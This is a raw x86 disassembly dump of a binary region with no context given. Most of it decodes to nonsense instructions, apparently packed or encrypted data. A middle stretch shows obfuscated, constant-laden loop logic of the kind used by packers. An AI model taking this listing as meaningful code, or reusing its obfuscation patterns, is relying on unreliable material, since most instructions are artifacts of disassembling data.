  41aeed:	scas   al,BYTE PTR es:[edi]
  41aeee:	out    dx,al
  41aeef:	fiadd  DWORD PTR [ebx+0x44be407]
  41aef5:	dec    esi
  41aef6:	cmp    eax,0x13fd92b0
  41aefb:	mov    edx,DWORD PTR [esi+0xde77358]
  41af01:	or     edx,ebp
  41af03:	jb     0x41aeec
  41af05:	or     DWORD PTR [ebx+0x34b24ead],edi
  41af0b:	(bad)  
  41af0c:	std    
  41af0d:	fdivr  QWORD PTR es:[edi+eax*1-0x5fd64c80]
  41af15:	pop    ds
  41af16:	mov    eax,es:0xb46e91f1
  41af1c:	scas   eax,DWORD PTR es:[edi]
  41af1d:	out    0x9a,eax
  41af1f:	shl    dl,cl
  41af21:	mov    ebx,edx
  41af23:	cwde   
  41af24:	xor    esi,DWORD PTR [ebx+eax*8-0x20]
  41af28:	enter  0xcbae,0xbe
  41af2c:	out    dx,eax
  41af2d:	and    DWORD PTR [edx],ecx
  41af2f:	retf   
  41af30:	icebp  
  41af31:	in     eax,0xc3
  41af33:	dec    ecx
  41af34:	jbe    0x41af40
  41af36:	or     dh,BYTE PTR [eax+edx*2+0x734838e5]
  41af3d:	push   ds
  41af3e:	adc    DWORD PTR [esi+0x20],esp
  41af41:	pop    esp
  41af42:	sbb    ebx,ebx
  41af44:	(bad)  
  41af45:	outs   dx,DWORD PTR ds:[esi]
  41af46:	repz repnz retf 0xbd87
  41af4b:	repz mov esp,?
  41af4e:	rol    DWORD PTR [edx-0x27d854ae],1
  41af54:	mov    eax,ds:0xab3a8849
  41af59:	jne    0x41aedf
  41af5b:	push   ds
  41af5c:	sub    ecx,esp
  41af5e:	or     dh,BYTE PTR ds:0x322c0de6
  41af64:	jmp    0x41af74
  41af66:	mov    BYTE PTR [esi],al
  41af68:	sti    
  41af69:	xor    al,BYTE PTR [ebx+0x65524f4a]
  41af6f:	pop    esi
  41af70:	fucomi st,st(0)
  41af72:	pop    esp
  41af73:	sbb    BYTE PTR [ecx-0x43500724],bl
  41af79:	addr16 xchg ecx,eax
  41af7b:	push   eax
  41af7c:	or     cl,BYTE PTR [eax-0x73]
  41af7f:	xchg   BYTE PTR [ebx+eax*8+0xe150913],ah
  41af86:	(bad)  
  41af87:	cmc    
  41af88:	mov    ch,0x41
  41af8a:	scas   al,BYTE PTR es:[edi]
  41af8b:	mov    ebx,0x820e47fd
  41af90:	or     dl,dl
  41af92:	dec    esi
  41af93:	jmp    0x9079:0xdc27276b
  41af9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af9b:	ds addr16 sbb al,0xc7
  41af9f:	inc    edi
  41afa0:	sbb    esi,DWORD PTR [ecx-0x1f]
  41afa3:	call   0xb0e8f081
  41afa8:	es out 0xf2,al
  41afab:	rol    DWORD PTR [edx],0x22
  41afae:	ins    BYTE PTR es:[edi],dx
  41afaf:	sub    bh,BYTE PTR cs:[ecx-0x2e18a057]
  41afb6:	int3   
  41afb7:	cmc    
  41afb8:	aam    0x89
  41afba:	mov    edx,0xd2f2a37b
  41afbf:	xor    ch,BYTE PTR [edi-0xcf19efe]
  41afc5:	jnp    0x41afe0
  41afc7:	out    0x4d,eax
  41afc9:	sbb    al,0x15
  41afcb:	sahf   
  41afcc:	fiadd  DWORD PTR [ecx+edi*4-0x2a]
  41afd0:	fs dec edx
  41afd2:	push   0x49
  41afd4:	pop    ebx
  41afd5:	mov    esp,0xe43d7e4f
  41afda:	adc    esp,ebp
  41afdc:	ins    DWORD PTR es:[edi],dx
  41afdd:	out    0x82,al
  41afdf:	xchg   esi,eax
  41afe0:	bound  ebx,QWORD PTR [esi-0x55f08471]
  41afe6:	jmp    0x41b03b
  41afe8:	mov    ds:0xdb037cfb,al
  41afed:	jb     0x41b028
  41afef:	scas   al,BYTE PTR es:[edi]
  41aff0:	xor    eax,0xc4e882ed
  41aff5:	pop    edi
  41aff6:	jg     0x41afb0
  41aff8:	test   eax,0xf25ec6b6
  41affd:	jg     0x41b061
  41afff:	ds mov cl,0xfe
  41b002:	(bad)  
  41b003:	fs (bad) 
  41b005:	and    al,0x3
  41b007:	adc    al,0x90
  41b009:	test   DWORD PTR [ebx+0x430561a5],edx
  41b00f:	cwde   
  41b010:	mov    BYTE PTR [ebx-0x48],0x5c
  41b014:	js     0x41affe
  41b016:	push   edi
  41b017:	pop    ecx
  41b018:	inc    esp
  41b019:	arpl   WORD PTR [eax],sp
  41b01b:	or     DWORD PTR [esi-0x53ecc113],edx
  41b021:	(bad)  
  41b022:	mov    eax,ds:0xda104855
  41b027:	outs   dx,BYTE PTR ds:[esi]
  41b028:	push   ecx
  41b029:	fldcw  WORD PTR [edx+0x2d003b80]
  41b02f:	pop    es
  41b030:	retf   
  41b031:	mov    cs,WORD PTR [ecx+0x454204ec]
  41b037:	jb     0x41b00b
  41b039:	rcl    BYTE PTR [ecx-0x7d985642],cl
  41b03f:	std    
  41b040:	sahf   
  41b041:	retf   0xe33
  41b044:	pop    eax
  41b045:	shl    DWORD PTR [ecx+edi*4+0x34],1
  41b049:	xor    ecx,DWORD PTR [eax+0xc]
  41b04c:	dec    eax
  41b04d:	(bad)  
  41b04e:	aad    0x61
  41b050:	mov    edx,DWORD PTR [ebp-0x14]
  41b053:	mov    DWORD PTR [ebp+0x8],edx
  41b056:	jmp    0x41b0cb
  41b05b:	mov    edx,DWORD PTR [ebp+0x8]
  41b05e:	mov    ebx,DWORD PTR [ebp-0x8]
  41b061:	xor    edx,eax
  41b063:	xor    ebx,eax
  41b065:	sub    edx,ebx
  41b067:	sub    edx,esi
  41b069:	xor    edx,eax
  41b06b:	mov    DWORD PTR [ebp+0x8],edx
  41b06e:	mov    edx,DWORD PTR [ebp+0x8]
  41b071:	mov    ebx,DWORD PTR [ebp-0x58]
  41b074:	add    edx,0x5708f1
  41b07a:	imul   edx,ebx
  41b07d:	mov    DWORD PTR [ebp-0x58],edx
  41b080:	mov    edx,DWORD PTR [ebp+0x8]
  41b083:	mov    ebx,DWORD PTR [ebp-0x54]
  41b086:	add    edx,0x64f893
  41b08c:	or     edx,ebx
  41b08e:	mov    DWORD PTR [ebp-0x54],edx
  41b091:	mov    edx,DWORD PTR [ebp+0x8]
  41b094:	mov    ebx,DWORD PTR [ebp-0x50]
  41b097:	add    edx,ecx
  41b099:	xor    edx,ebx
  41b09b:	mov    DWORD PTR [ebp-0x50],edx
  41b09e:	mov    edx,DWORD PTR [ebp+0x8]
  41b0a1:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b0a4:	add    edx,edi
  41b0a6:	and    edx,ebx
  41b0a8:	mov    DWORD PTR [ebp-0x4c],edx
  41b0ab:	mov    edx,DWORD PTR [ebp+0x8]
  41b0ae:	mov    ebx,DWORD PTR [ebp-0x48]
  41b0b1:	lea    edx,[ebx+edx*1+0x241fcde]
  41b0b8:	mov    DWORD PTR [ebp-0x48],edx
  41b0bb:	mov    edx,DWORD PTR [ebp+0x8]
  41b0be:	mov    ebx,0xfa5e1521
  41b0c3:	sub    ebx,edx
  41b0c5:	add    ebx,DWORD PTR [ebp-0x44]
  41b0c8:	mov    DWORD PTR [ebp-0x44],ebx
  41b0cb:	mov    edx,DWORD PTR [ebp+0x8]
  41b0ce:	xor    edx,eax
  41b0d0:	add    edx,esi
  41b0d2:	jne    0x41b05b
  41b0d8:	mov    edx,DWORD PTR [ebp-0x14]
  41b0db:	mov    DWORD PTR [ebp+0x8],edx
  41b0de:	jmp    0x41b153
  41b0e3:	mov    edx,DWORD PTR [ebp+0x8]
  41b0e6:	mov    ebx,DWORD PTR [ebp-0x8]
  41b0e9:	xor    edx,eax
  41b0eb:	xor    ebx,eax
  41b0ed:	sub    edx,ebx
  41b0ef:	sub    edx,esi
  41b0f1:	xor    edx,eax
  41b0f3:	mov    DWORD PTR [ebp+0x8],edx
  41b0f6:	mov    edx,DWORD PTR [ebp+0x8]
  41b0f9:	mov    ebx,DWORD PTR [ebp-0x58]
  41b0fc:	add    edx,0x5708f1
  41b102:	imul   edx,ebx
  41b105:	mov    DWORD PTR [ebp-0x58],edx
  41b108:	mov    edx,DWORD PTR [ebp+0x8]
  41b10b:	mov    ebx,DWORD PTR [ebp-0x54]
  41b10e:	add    edx,0x64f893
  41b114:	or     edx,ebx
  41b116:	mov    DWORD PTR [ebp-0x54],edx
  41b119:	mov    edx,DWORD PTR [ebp+0x8]
  41b11c:	mov    ebx,DWORD PTR [ebp-0x50]
  41b11f:	add    edx,ecx
  41b121:	xor    edx,ebx
  41b123:	mov    DWORD PTR [ebp-0x50],edx
  41b126:	mov    edx,DWORD PTR [ebp+0x8]
  41b129:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b12c:	add    edx,edi
  41b12e:	and    edx,ebx
  41b130:	mov    DWORD PTR [ebp-0x4c],edx
  41b133:	mov    edx,DWORD PTR [ebp+0x8]
  41b136:	mov    ebx,DWORD PTR [ebp-0x48]
  41b139:	lea    edx,[ebx+edx*1+0x241fcde]
  41b140:	mov    DWORD PTR [ebp-0x48],edx
  41b143:	mov    edx,DWORD PTR [ebp+0x8]
  41b146:	mov    ebx,0xfa5e1521
  41b14b:	sub    ebx,edx
  41b14d:	add    ebx,DWORD PTR [ebp-0x44]
  41b150:	mov    DWORD PTR [ebp-0x44],ebx
  41b153:	mov    edx,DWORD PTR [ebp+0x8]
  41b156:	xor    edx,eax
  41b158:	add    edx,esi
  41b15a:	jne    0x41b0e3
  41b160:	mov    edx,DWORD PTR [ebp-0x8]
  41b163:	mov    ebx,DWORD PTR [ebp-0xc]
  41b166:	xor    edx,eax
  41b168:	lea    edx,[edx+ebx*1+0x3272ec]
  41b16f:	mov    DWORD PTR [ebp-0xc],edx
  41b172:	mov    edx,DWORD PTR [ebp-0x10]
  41b175:	xor    edx,eax
  41b177:	add    edx,esi
  41b179:	jne    0x411e2e
  41b17f:	jmp    0x41d637
  41b184:	mov    ecx,DWORD PTR [ebp-0x14]
  41b187:	mov    DWORD PTR [ebp+0x8],ecx
  41b18a:	jmp    0x41b203
  41b18f:	mov    ecx,DWORD PTR [ebp+0x8]
  41b192:	mov    edx,DWORD PTR [ebp-0x8]
  41b195:	xor    ecx,eax
  41b197:	xor    edx,eax
  41b199:	sub    ecx,edx
  41b19b:	sub    ecx,esi
  41b19d:	xor    ecx,eax
  41b19f:	mov    DWORD PTR [ebp+0x8],ecx
  41b1a2:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1a5:	mov    edx,DWORD PTR [ebp-0x58]
  41b1a8:	add    ecx,0x5708f1
  41b1ae:	imul   ecx,edx
  41b1b1:	mov    DWORD PTR [ebp-0x58],ecx
  41b1b4:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1b7:	mov    edx,DWORD PTR [ebp-0x54]
  41b1ba:	add    ecx,0x64f893
  41b1c0:	or     ecx,edx
  41b1c2:	mov    DWORD PTR [ebp-0x54],ecx
  41b1c5:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1c8:	mov    edx,DWORD PTR [ebp-0x50]
  41b1cb:	add    ecx,0x242ebcc
  41b1d1:	xor    ecx,edx
  41b1d3:	mov    DWORD PTR [ebp-0x50],ecx
  41b1d6:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1d9:	mov    edx,DWORD PTR [ebp-0x4c]
  41b1dc:	add    ecx,edi
  41b1de:	and    ecx,edx
  41b1e0:	mov    DWORD PTR [ebp-0x4c],ecx
  41b1e3:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1e6:	mov    edx,DWORD PTR [ebp-0x48]
  41b1e9:	lea    ecx,[edx+ecx*1+0x241fcde]
  41b1f0:	mov    DWORD PTR [ebp-0x48],ecx
  41b1f3:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1f6:	mov    edx,0xfa5e1521
  41b1fb:	sub    edx,ecx
  41b1fd:	add    edx,DWORD PTR [ebp-0x44]
  41b200:	mov    DWORD PTR [ebp-0x44],edx
  41b203:	mov    ecx,DWORD PTR [ebp+0x8]
  41b206:	xor    ecx,eax
  41b208:	add    ecx,esi
  41b20a:	jne    0x41b18f
  41b210:	jmp    0x41d643
  41b215:	mov    ecx,DWORD PTR [ebp+0x8]
  41b218:	mov    edx,DWORD PTR [ebp-0x8]
  41b21b:	xor    ecx,eax
  41b21d:	xor    edx,eax
  41b21f:	sub    ecx,edx
  41b221:	sub    ecx,esi
  41b223:	xor    ecx,eax
  41b225:	mov    DWORD PTR [ebp+0x8],ecx
  41b228:	mov    ecx,DWORD PTR [ebp+0x8]
  41b22b:	mov    edx,DWORD PTR [ebp-0x58]
  41b22e:	add    ecx,0x5708f1
  41b234:	imul   ecx,edx
  41b237:	mov    DWORD PTR [ebp-0x58],ecx
  41b23a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b23d:	mov    edx,DWORD PTR [ebp-0x54]
  41b240:	add    ecx,0x64f893
  41b246:	or     ecx,edx
  41b248:	mov    DWORD PTR [ebp-0x54],ecx
  41b24b:	mov    ecx,DWORD PTR [ebp+0x8]
  41b24e:	mov    edx,DWORD PTR [ebp-0x50]
  41b251:	add    ecx,0x242ebcc
  41b257:	xor    ecx,edx
  41b259:	mov    DWORD PTR [ebp-0x50],ecx
  41b25c:	mov    ecx,DWORD PTR [ebp+0x8]
  41b25f:	mov    edx,DWORD PTR [ebp-0x4c]
  41b262:	add    ecx,edi
  41b264:	and    ecx,edx
  41b266:	mov    DWORD PTR [ebp-0x4c],ecx
  41b269:	mov    ecx,DWORD PTR [ebp+0x8]
  41b26c:	mov    edx,DWORD PTR [ebp-0x48]
  41b26f:	jmp    0x41d610
  41b274:	enter  0x7064,0x8f
  41b278:	sar    BYTE PTR [ebx+0x7b],0x1b
  41b27c:	add    al,0xea
  41b27e:	sbb    DWORD PTR [ecx],0xc04e4fc5
  41b284:	mov    dh,0xf0
  41b286:	jge    0x41b302
  41b288:	(bad)  
  41b289:	pop    edi
  41b28a:	jp     0x41b306
  41b28c:	addr16 cmc 
  41b28e:	mov    al,0xab
  41b290:	dec    BYTE PTR [edi+0x62e4dd87]
  41b296:	pop    ss
  41b297:	jbe    0x41b277
  41b299:	inc    ebp
  41b29a:	xchg   DWORD PTR [eax-0x69],ebp
  41b29d:	push   cs
  41b29e:	mov    ?,WORD PTR [edx]
  41b2a0:	mov    eax,ds:0xe3b12df5
  41b2a5:	fidivr WORD PTR [edx+0x1c]
  41b2a8:	lods   eax,DWORD PTR ds:[esi]
  41b2a9:	js     0x41b329
  41b2ab:	pop    edx
  41b2ac:	mov    ecx,0x6125353a
  41b2b1:	inc    ebp
  41b2b2:	cmp    BYTE PTR [ecx-0x6a],dh
  41b2b5:	mov    eax,ds:0x277a5b97
  41b2ba:	arpl   WORD PTR [edi],si
  41b2bc:	jo     0x41b2d8
  41b2be:	mov    BYTE PTR [edx],bh
  41b2c0:	xchg   edi,eax
  41b2c1:	lds    esi,FWORD PTR [eax+0x71]
  41b2c4:	aam    0x97
  41b2c6:	pop    ds
  41b2c7:	cwde   
  41b2c8:	xchg   edx,eax
  41b2c9:	push   ss
  41b2ca:	push   cs
  41b2cb:	jno    0x41b2f1
  41b2cd:	mov    ebx,esp
  41b2cf:	in     al,0xdf
  41b2d1:	xchg   ecx,eax
  41b2d2:	shl    BYTE PTR [eax+0x4db98994],0x73
  41b2d9:	gs ja  0x41b276
  41b2dc:	cmp    DWORD PTR [edi],ebx
  41b2de:	sahf   
  41b2df:	stc    
  41b2e0:	ins    BYTE PTR es:[edi],dx
  41b2e1:	test   DWORD PTR [ebp-0x5f],ebp
  41b2e4:	pop    eax
  41b2e5:	in     al,0x7c
  41b2e7:	inc    edx
  41b2e8:	stos   BYTE PTR es:[edi],al
  41b2e9:	popa   
  41b2ea:	stos   BYTE PTR es:[edi],al
  41b2eb:	lock aad 0x35
  41b2ee:	inc    esp
  41b2ef:	mov    esi,0x30a8d60
  41b2f4:	inc    ecx
  41b2f5:	inc    edx
  41b2f6:	rcl    BYTE PTR [esi],1
  41b2f8:	retf   
  41b2f9:	push   ebx
  41b2fa:	mov    ch,0x77
  41b2fc:	lahf   
  41b2fd:	out    dx,al
  41b2fe:	jmp    0x131:0x69681f7a
  41b305:	sub    DWORD PTR [edi-0x7d],0xe71c73c1
  41b30c:	fbld   TBYTE PTR [eax+eiz*1+0x53]
  41b310:	inc    ebx
  41b311:	add    al,BYTE PTR [esi+0x3b888289]
  41b317:	lds    edi,FWORD PTR [edi]
  41b319:	loope  0x41b2d8
  41b31b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b31c:	mov    al,ds:0x5898a6cd
  41b321:	clc    
  41b322:	outs   dx,BYTE PTR ds:[esi]
  41b323:	dec    ebp
  41b324:	cld    
  41b325:	fcmovnbe st,st(1)
  41b327:	in     al,0x39
  41b329:	or     al,0xba
  41b32b:	xchg   ebx,eax
  41b32c:	pop    eax
  41b32d:	push   0xb797c2a9
  41b332:	out    dx,eax
  41b333:	sahf   
  41b334:	pop    ss
  41b335:	jbe    0x41b309
  41b337:	mov    cl,0x6e
  41b339:	jle    0x41b39a
  41b33b:	mov    edi,0xc2780f09
  41b340:	mov    al,0x71
  41b342:	cld    
  41b343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b344:	in     eax,dx
  41b345:	cmp    al,0xb
  41b347:	ins    DWORD PTR es:[edi],dx
  41b348:	adc    ecx,DWORD PTR [edi+ebp*4+0x42]
  41b34c:	mov    ds:0xc308fa57,al
  41b351:	test   eax,0x4b0e2c4b
  41b356:	mov    ch,0x6b
  41b358:	idiv   BYTE PTR ds:0xb19c892c
  41b35e:	pushf  
  41b35f:	xchg   esi,eax
  41b360:	inc    edx
  41b361:	fld    QWORD PTR [esi]
  41b363:	lods   al,BYTE PTR ds:[esi]
  41b364:	add    esi,eax
  41b366:	and    eax,0xb5996afd
  41b36b:	cmc    
  41b36c:	and    BYTE PTR [ebp+0x7553f895],dh
  41b372:	fld    QWORD PTR [ecx-0x79a380b5]
  41b378:	dec    ebx
  41b379:	xor    esp,DWORD PTR [edi+eiz*8]
  41b37c:	call   0x316a:0x1f4b876f
  41b383:	in     al,dx
  41b384:	sub    BYTE PTR [edx+ecx*8-0x7aeff827],0xf1
  41b38c:	pop    ds
  41b38d:	jg     0x41b3b7
  41b38f:	xor    al,0x11
  41b391:	jp     0x41b313
  41b393:	(bad)  
  41b394:	retf   0xe0a
  41b397:	xor    eax,0xb91da508
  41b39c:	xor    al,0x92
  41b39e:	out    0x51,eax
  41b3a0:	jle    0x41b3d4
  41b3a2:	and    BYTE PTR ds:0x9d5a785e,bh
  41b3a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3a9:	inc    ebx
  41b3aa:	cmp    al,0x25
  41b3ac:	mov    al,ds:0x9858ca8c
  41b3b1:	js     0x41b344
  41b3b3:	sub    bh,BYTE PTR [edx]
  41b3b5:	push   0x6f
  41b3b7:	and    eax,0x9718aed6
  41b3bc:	inc    edi
  41b3bd:	imul   ebx,DWORD PTR [ebx+eax*2-0x64bef2],0xffffffc8
  41b3c5:	call   0x8b7d711
  41b3ca:	xchg   edx,eax
  41b3cb:	ins    DWORD PTR es:[edi],dx
  41b3cc:	sub    esp,DWORD PTR [edi+0x7f]
  41b3cf:	push   ebp
  41b3d0:	mov    cl,0x7c
  41b3d2:	dec    edx
  41b3d3:	jg     0x41b3a2
  41b3d5:	cld    
  41b3d6:	call   0x55a8:0xa74fdfd8
  41b3dd:	inc    esi
  41b3de:	aas    
  41b3df:	rcr    ch,cl
  41b3e1:	test   eax,0x226f02f1
  41b3e6:	or     ah,BYTE PTR [esi+0x256bee41]
  41b3ec:	lods   eax,DWORD PTR ds:[esi]
  41b3ed:	(bad)  
  41b3ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ef:	add    al,0xf7
  41b3f1:	inc    edx
  41b3f2:	mov    eax,0x5761c41e
  41b3f7:	clc    
  41b3f8:	pop    ebx
  41b3f9:	push   ds
  41b3fa:	fcmovu st,st(7)
  41b3fc:	push   esi
  41b3fd:	cmp    eax,0x38fb5cbc
  41b402:	repz enter 0x5d13,0xf7
  41b407:	push   cs
  41b408:	stc    
  41b409:	std    
  41b40a:	push   edx
  41b40b:	je     0x41b43f
  41b40d:	data16 mov ah,0x5d
  41b410:	pop    ebx
  41b411:	test   al,0x55
  41b413:	cmp    al,0x78
  41b415:	mov    bl,0xea
  41b417:	inc    ebp
  41b418:	in     al,dx
  41b419:	(bad)  [edx]
  41b41b:	adc    al,0x3e
  41b41d:	mov    dl,0xb2
  41b41f:	xchg   bl,bh
  41b421:	jg     0x41b3df
  41b423:	ins    BYTE PTR es:[edi],dx
  41b424:	ret    
  41b425:	lods   eax,DWORD PTR ds:[esi]
  41b426:	popa   
  41b427:	sbb    DWORD PTR [ebx-0x4601e33f],0x8c981e41
  41b431:	and    bh,BYTE PTR [edi]
  41b433:	scas   al,BYTE PTR es:[edi]
  41b434:	xchg   eax,eax
  41b436:	out    dx,eax
  41b437:	push   ebx
  41b438:	lds    edx,FWORD PTR [edx+0x7c]
  41b43b:	in     al,0xa7
  41b43d:	and    eax,0x5e9a51c2
  41b442:	mov    WORD PTR [eax+ebp*4-0x3c],ds
  41b446:	jmp    0x238ce639
  41b44b:	xchg   ecx,eax
  41b44c:	pop    ebx
  41b44d:	stos   BYTE PTR es:[edi],al
  41b44e:	adc    al,0x84
  41b450:	(bad)  
  41b452:	(bad)  
  41b453:	cli    
  41b454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b455:	dec    esp
  41b456:	pop    edx
  41b457:	mov    dh,0x54
  41b459:	stos   BYTE PTR es:[edi],al
  41b45a:	inc    edx
  41b45b:	out    0x9c,al
  41b45d:	pop    es
  41b45e:	mov    bh,BYTE PTR [eax+0x591ef917]
  41b464:	inc    esi
  41b465:	pop    ss
  41b466:	int    0x2b
  41b468:	aad    0x66
  41b46a:	clc    
  41b46b:	lds    edi,FWORD PTR [edi+0x3b]
  41b46e:	ins    DWORD PTR es:[edi],dx
  41b46f:	(bad)  
  41b470:	(bad)  
  41b471:	fidivr WORD PTR [edi+0x230f2080]
  41b477:	mov    al,0x62
  41b479:	jmp    0xb4f37329
  41b47e:	cmc    
  41b47f:	shl    BYTE PTR [edi-0x24f7a380],1
  41b485:	cmp    BYTE PTR [ebp-0x74],dh
  41b488:	cmp    DWORD PTR [edi+0x342588bc],ecx
  41b48e:	adc    DWORD PTR [eax+0x2e],eax
  41b491:	inc    eax
  41b493:	dec    DWORD PTR [ebp+0x6]
  41b496:	mov    esi,0x826406
  41b49b:	jmp    0xd42108dc
  41b4a0:	xor    ebp,esp
  41b4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4a3:	(bad)  
  41b4a5:	data16 xlat BYTE PTR ds:[ebx]
  41b4a7:	xchg   edx,eax
  41b4a8:	call   0x7b82477e
  41b4ad:	add    al,0x4d
  41b4af:	add    al,0xc5
  41b4b1:	jge    0x41b48f
  41b4b3:	xchg   edi,eax
  41b4b4:	lahf   
  41b4b5:	imul   eax,DWORD PTR [eax],0xa3ad58ff
  41b4bb:	mov    ebp,DWORD PTR [ebp+0x6e43e350]
  41b4c1:	addr16 mov eax,ds:0x8718
  41b4c5:	fisubr WORD PTR [eax-0x7020fb89]
  41b4cb:	cmp    eax,0x87f45aff
  41b4d0:	fldcw  WORD PTR [edi+0x69]
  41b4d3:	jbe    0x41b511
  41b4d5:	push   es
  41b4d6:	outs   dx,DWORD PTR ds:[esi]
  41b4d7:	in     al,0xa6
  41b4d9:	or     al,0x5c
  41b4db:	jg     0x41b528
  41b4dd:	mov    al,0xd
  41b4df:	fdivr  st(1),st
  41b4e1:	test   ebp,edx
  41b4e3:	ror    BYTE PTR [eax],cl
  41b4e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4e6:	xchg   edx,eax
  41b4e7:	xor    ch,BYTE PTR [ecx+0x1ad00a66]
  41b4ed:	mov    bh,0x3f
  41b4ef:	inc    esi
  41b4f0:	out    0x83,al
  41b4f2:	out    0x6a,al
  41b4f4:	cwde   
  41b4f5:	and    esi,edx
  41b4f7:	dec    ecx
  41b4f8:	xchg   ecx,eax
  41b4f9:	aad    0x6d
  41b4fb:	inc    eax
  41b4fc:	inc    ecx
  41b4fd:	ins    BYTE PTR es:[edi],dx
  41b4fe:	mov    esi,0x451a0045
  41b503:	sub    eax,0xa507c21f
  41b508:	add    DWORD PTR [ecx-0x2],ecx
  41b50b:	inc    eax
  41b50c:	sbb    dl,BYTE PTR [eax-0xbe08f8f]
  41b512:	xor    edi,ebp
  41b514:	xchg   esp,eax
  41b515:	push   ss
  41b516:	cmp    edx,DWORD PTR [ecx]
  41b518:	push   ds
  41b519:	and    al,0x4
  41b51b:	cdq    
  41b51c:	mov    ebx,0x2be3d657
  41b521:	or     eax,0x4f04f5f9
  41b526:	pop    esp
  41b527:	jmp    0x46fc47d4
  41b52c:	jno    0x41b4ae
  41b52e:	mov    dl,0x93
  41b530:	ins    BYTE PTR es:[edi],dx
  41b531:	push   ebp
  41b532:	repnz lods eax,DWORD PTR ds:[esi]
  41b534:	jbe    0x41b4d9
  41b536:	xor    ebp,edx
  41b538:	aas    
  41b539:	call   0x27cff86b
  41b53e:	mov    bh,0x9e
  41b540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b541:	xor    eax,0x8bcbb48
  41b546:	repz sahf 
  41b548:	lock add al,0xaa
  41b54b:	xor    edi,esi
  41b54d:	inc    ebp
  41b54e:	inc    ebx
  41b54f:	jno    0x41b558
  41b551:	xchg   esp,eax
  41b552:	(bad)  
  41b553:	cmp    edi,edx
  41b555:	stos   BYTE PTR es:[edi],al
  41b556:	pop    ss
  41b557:	pop    edx
  41b558:	pop    ss
  41b559:	and    al,0x49
  41b55b:	test   al,0x21
  41b55d:	xlat   BYTE PTR ds:[ebx]
  41b55e:	adc    edi,DWORD PTR [ecx]
  41b560:	fistp  DWORD PTR [edx]
  41b562:	test   BYTE PTR [edi-0x198caea4],ah
  41b568:	inc    edi
  41b569:	cwde   
  41b56a:	mov    al,0xd7
  41b56c:	inc    eax
  41b56d:	sub    ecx,esi
  41b56f:	xor    dl,BYTE PTR [edi]
  41b571:	ins    DWORD PTR es:[edi],dx
  41b572:	inc    esi
  41b573:	sti    
  41b574:	int    0x5a
  41b576:	and    ebx,DWORD PTR [ebp-0x1d]
  41b579:	or     dl,BYTE PTR [ebx+0x7ed0dca2]
  41b57f:	push   edx
  41b580:	test   cl,dl
  41b582:	sub    al,0xe0
  41b584:	icebp  
  41b585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b586:	mov    al,0x6a
  41b588:	sbb    eax,0xeb79a2fe
  41b58d:	xchg   edx,eax
  41b58e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b58f:	sbb    DWORD PTR [ebp-0x24c9d835],ecx
  41b595:	test   al,0x76
  41b597:	dec    edi
  41b598:	pop    edx
  41b599:	ss jge 0x41b576
  41b59c:	fidiv  WORD PTR [esp+edi*4+0x5a]
  41b5a0:	inc    ebx
  41b5a1:	push   es
  41b5a2:	test   DWORD PTR [ebx],ebx
  41b5a4:	sbb    eax,0xee7d25ba
  41b5a9:	sbb    al,BYTE PTR [ecx+0x62]
  41b5ac:	pop    eax
  41b5ad:	jmp    0x41b57f
  41b5af:	push   eax
  41b5b0:	aad    0x21
  41b5b2:	jmp    0x41b62c
  41b5b4:	push   ebx
  41b5b5:	sbb    DWORD PTR [eax],esp
  41b5b7:	test   al,0xe5
  41b5b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5ba:	mov    dl,BYTE PTR [esp+eiz*4+0x39]
  41b5be:	mov    ds:0x3a8c62d6,al
  41b5c3:	int3   
  41b5c4:	cs adc al,0xc2
  41b5c7:	mov    edx,0x60a66a02
  41b5cc:	jbe    0x41b5f6
  41b5ce:	sbb    dh,al
  41b5d0:	stc    
  41b5d1:	es int3 
  41b5d3:	out    dx,al
  41b5d4:	inc    ecx
  41b5d5:	adc    eax,0x9ab02414
  41b5da:	pusha  
  41b5db:	adc    eax,0x2dd2fac
  41b5e0:	mov    ebx,0xae6bff32
  41b5e5:	mov    ?,WORD PTR [ebx+edx*1-0x40]
  41b5e9:	mov    BYTE PTR [esi],al
  41b5eb:	js     0x41b62f
  41b5ed:	or     eax,0xbb498d12
  41b5f2:	inc    esi
  41b5f3:	lock aad 0x1
  41b5f6:	fwait
  41b5f7:	clc    
  41b5f8:	mov    ah,0x7
  41b5fa:	add    edx,DWORD PTR cs:[edi+esi*1+0x27]
  41b5ff:	jns    0x41b5b8
  41b601:	adc    edi,DWORD PTR [eax+0x5cd1cfc9]
  41b607:	sub    BYTE PTR [esi+0x55b4a1ad],al
  41b60d:	lds    ecx,FWORD PTR [edi+eiz*2-0x52]
  41b611:	jg     0x41b5f2
  41b613:	xlat   BYTE PTR ds:[ebx]
  41b614:	jns    0x41b5fd
  41b616:	or     eax,0x8a974acd
  41b61b:	pop    es
  41b61c:	push   0xbbb60ede
  41b621:	ja     0x41b5cc
  41b623:	fs retf 0xcb8e
  41b627:	shr    BYTE PTR [ecx+0x6c],0x61
  41b62b:	sub    al,0x9d
  41b62d:	ret    
  41b62e:	mov    dl,0x7a
  41b630:	idiv   DWORD PTR [edi-0xd985510]
  41b636:	sub    BYTE PTR [eax-0x1c],dl
  41b639:	mov    fs,WORD PTR [edi+0x62]
  41b63c:	fptan  
  41b63e:	pop    eax
  41b63f:	jmp    0x42a4dca
  41b644:	ror    BYTE PTR [eax+ebp*2],0xca
  41b648:	test   DWORD PTR [edi-0x6c8c2f3f],ebp
  41b64e:	loop   0x41b5e9
